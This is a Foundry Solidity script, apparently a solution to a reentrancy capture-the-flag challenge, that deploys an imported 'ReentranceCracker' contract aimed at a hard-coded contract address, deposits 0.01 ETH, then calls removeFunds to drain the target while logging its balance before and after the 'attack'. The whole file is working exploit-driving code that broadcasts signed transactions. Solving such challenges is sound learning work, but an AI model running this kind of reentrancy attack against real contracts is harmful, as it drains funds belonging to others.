pragma solidity >=0.4.22 <0.9.0;
import "../lib/forge-std/src/Script.sol";
import "../src/Solutions/ReentranceCracker.sol";
import "../lib/forge-std/src/console.sol";

contract InitiateReentrance is Script {
    ReentranceCracker reentranceCracker;

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        reentranceCracker = new ReentranceCracker(
            payable(0x915aA65Ca9AF24dF9eCf5690aDF9D40c7107F9b2)
        );
        uint256 ethBalanceBefore = 0x915aA65Ca9AF24dF9eCf5690aDF9D40c7107F9b2
            .balance;
        console.log("before");
        console.log(ethBalanceBefore);
        reentranceCracker.sendFunds{value: 10000000000000000 wei}();
        uint256 ethBalanceAfter = 0x915aA65Ca9AF24dF9eCf5690aDF9D40c7107F9b2
            .balance;
        console.log("after");
        console.log(ethBalanceAfter);
        reentranceCracker.removeFunds(10000000000000000 wei);
        uint256 ethBalanceAfterAttack = 0x915aA65Ca9AF24dF9eCf5690aDF9D40c7107F9b2
                .balance;
        console.log("after attack");
        console.log(ethBalanceAfterAttack);
        vm.stopBroadcast();
    }
}
